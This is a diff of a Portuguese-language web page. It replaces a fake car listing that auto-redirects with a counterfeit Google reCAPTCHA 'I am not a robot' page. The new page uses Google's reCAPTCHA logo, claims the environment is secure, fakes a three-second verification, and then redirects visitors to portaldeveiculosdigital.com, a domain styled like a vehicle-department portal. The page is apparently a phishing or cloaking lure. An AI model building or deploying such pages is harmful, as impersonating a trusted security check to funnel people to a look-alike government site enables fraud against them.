@@ -1,82 +1,387 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <script>window.location.replace('https://departamentodeveiculo.com/go');</script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Informações do Veículo</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificação de Segurança</title>
 
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f2f2f2;
-            margin: 0;
-            padding: 40px;
-        }
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
 
-        .veiculo {
-            max-width: 500px;
-            margin: auto;
-            background-color: white;
-            padding: 25px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px #ccc;
-        }
+body{
+  font-family:Arial, Helvetica, sans-serif;
+  background:#d9dde3;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+}
 
-        h1 {
-            color: #222;
-        }
+/* CARD */
+.card{
+  width:380px;
+  background:#fff;
+  border-radius:14px;
+  padding:28px 25px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.08);
+  position:relative;
+  overflow:hidden;
+  text-align:center;
+}
 
-        .info {
-            margin: 10px 0;
-            padding: 10px;
-            background-color: #eee;
-            border-radius: 5px;
-        }
+/* LINHA SUPERIOR */
+.card::before{
+  content:"";
+  position:absolute;
+  top:0;
+  left:0;
+  width:100%;
+  height:2px;
+  background:#cbd5e1;
+}
 
-        .preco {
-            color: green;
-            font-size: 22px;
-            font-weight: bold;
-        }
-    </style>
+/* TITULO */
+.title{
+  font-size:22px;
+  font-weight:700;
+  color:#1e293b;
+  margin-bottom:10px;
+}
+
+/* SUBTITULO */
+.subtitle{
+  font-size:14px;
+  color:#64748b;
+  margin-bottom:22px;
+  line-height:1.5;
+}
+
+/* CAPTCHA */
+.captcha-box{
+  border:1px solid #d1d5db;
+  border-radius:10px;
+  background:#f8fafc;
+  padding:18px;
+}
+
+.captcha-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:10px;
+}
+
+/* CHECK */
+.check-area{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  cursor:pointer;
+  padding:10px;
+  border-radius:12px;
+  transition:0.25s;
+}
+
+.check-area:hover{
+  background:#e2e8f0;
+}
+
+.check-area input{
+  display:none;
+}
+
+.custom-check{
+  width:28px;
+  height:28px;
+  border:2px solid #7c7c7c;
+  border-radius:8px;
+  background:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  position:relative;
+  transition:0.25s ease;
+  flex-shrink:0;
+}
+
+.custom-check.loading::before{
+  content:"";
+  width:16px;
+  height:16px;
+  border:2px solid #dbeafe;
+  border-top:2px solid #2563eb;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+}
+
+.custom-check.checked{
+  border-color:#16a34a;
+  background:#f0fdf4;
+}
+
+.custom-check.checked::before{
+  content:"✔";
+  color:#16a34a;
+  font-size:16px;
+  font-weight:bold;
+}
+
+.check-text{
+  font-size:14px;
+  color:#0f172a;
+  white-space:nowrap;
+}
+
+/* RECAPTCHA */
+.captcha-brand{
+  text-align:center;
+  font-size:11px;
+  color:#64748b;
+  min-width:70px;
+}
+
+.captcha-brand img{
+  width:34px;
+  display:block;
+  margin:0 auto 3px;
+}
+
+/* SEGURANÇA */
+.secure{
+  margin-top:18px;
+  color:#16a34a;
+  font-size:14px;
+  font-weight:600;
+}
+
+/* FOOTER */
+.footer{
+  margin-top:16px;
+  text-align:center;
+  font-size:14px;
+  color:#64748b;
+  line-height:1.6;
+}
+
+.footer span{
+  display:block;
+  color:#94a3b8;
+  margin-top:6px;
+  font-size:14px;
+}
+
+/* POPUP */
+.popup{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,0.4);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:999;
+}
+
+.popup-box{
+  background:#fff;
+  width:330px;
+  padding:28px;
+  border-radius:16px;
+  text-align:center;
+  animation:fadeIn .3s ease;
+  box-shadow:0 10px 30px rgba(0,0,0,0.15);
+}
+
+.popup-icon{
+  width:70px;
+  height:70px;
+  background:#dcfce7;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0 auto 15px;
+  font-size:34px;
+  color:#16a34a;
+}
+
+.popup h2{
+  color:#0f172a;
+  margin-bottom:10px;
+  font-size:22px;
+}
+
+.popup p{
+  color:#64748b;
+  font-size:14px;
+  line-height:1.5;
+  margin-bottom:20px;
+}
+
+.popup button{
+  background:#2563eb;
+  color:#fff;
+  border:none;
+  padding:12px 25px;
+  border-radius:10px;
+  cursor:pointer;
+  font-size:14px;
+  transition:.2s;
+}
+
+.popup button:hover{
+  background:#1d4ed8;
+}
+
+/* ANIMAÇÕES */
+@keyframes spin{
+  from{
+    transform:rotate(0deg);
+  }
+  to{
+    transform:rotate(360deg);
+  }
+}
+
+@keyframes fadeIn{
+  from{
+    opacity:0;
+    transform:scale(.9);
+  }
+  to{
+    opacity:1;
+    transform:scale(1);
+  }
+}
+</style>
 </head>
 
 <body>
 
-    <div class="veiculo">
-        <h1>🚗 Ford Mustang</h1>
+<div class="card">
 
-        <div class="info">
-            <strong>Ano:</strong> 2024
-        </div>
+  <div class="title">
+    Verificação de Segurança
+  </div>
 
-        <div class="info">
-            <strong>Motor:</strong> 5.0 V8
-        </div>
+  <div class="subtitle">
+    Confirme que você é humano para continuar
+  </div>
 
-        <div class="info">
-            <strong>Combustível:</strong> Gasolina
-        </div>
+  <div class="captcha-box">
 
-        <div class="info">
-            <strong>Câmbio:</strong> Automático
-        </div>
+    <div class="captcha-row">
 
-        <div class="info">
-            <strong>Cor:</strong> Preto
-        </div>
+      <label class="check-area">
 
-        <div class="info">
-            <strong>Quilometragem:</strong> 15.000 km
-        </div>
+        <input type="checkbox" id="check">
 
-        <p class="preco">R$ 450.000,00</p>
+        <div class="custom-check" id="customCheck"></div>
 
-        <button onclick="alert('Veículo selecionado!')">
-            Ver veículo
-        </button>
+        <span class="check-text" id="text">
+          Não sou um robô
+        </span>
+
+      </label>
+
+      <div class="captcha-brand">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+        reCAPTCHA
+        <br>
+        <span style="font-size:11px;">
+          Privacidade - Termos
+        </span>
+      </div>
+
     </div>
+
+  </div>
+
+  <div class="secure">
+    ✔ Ambiente seguro e protegido
+  </div>
+
+  <div class="footer">
+    Após marcar a opção, a verificação será realizada automaticamente
+
+    <span>
+      Isso ajuda a proteger o sistema contra acessos indevidos
+    </span>
+  </div>
+
+</div>
+
+<!-- POPUP -->
+<div class="popup" id="popup">
+
+  <div class="popup-box">
+
+    <div class="popup-icon">
+      ✔
+    </div>
+
+    <h2>
+      Verificação concluída
+    </h2>
+
+    <p>
+      Sua verificação foi realizada com sucesso.
+      Clique abaixo para continuar para o próximo passo.
+    </p>
+
+    <button id="continueBtn">
+      Continuar
+    </button>
+
+  </div>
+
+</div>
+
+<script>
+const check = document.getElementById("check");
+const customCheck = document.getElementById("customCheck");
+const text = document.getElementById("text");
+const popup = document.getElementById("popup");
+
+check.addEventListener("change", function(){
+
+  if(check.checked){
+
+    customCheck.classList.add("loading");
+
+    text.innerText = "Verificando...";
+
+    setTimeout(function(){
+
+      customCheck.classList.remove("loading");
+
+      customCheck.classList.add("checked");
+
+      text.innerText = "Verificado ✔";
+
+      popup.style.display = "flex";
+
+    }, 3000);
+
+  }
+
+});
+
+document
+.getElementById("continueBtn")
+.addEventListener("click", function(){
+
+  window.location.href =
+  "https://portaldeveiculosdigital.com/rs/";
+
+});
+</script>
 
 </body>
 </html>
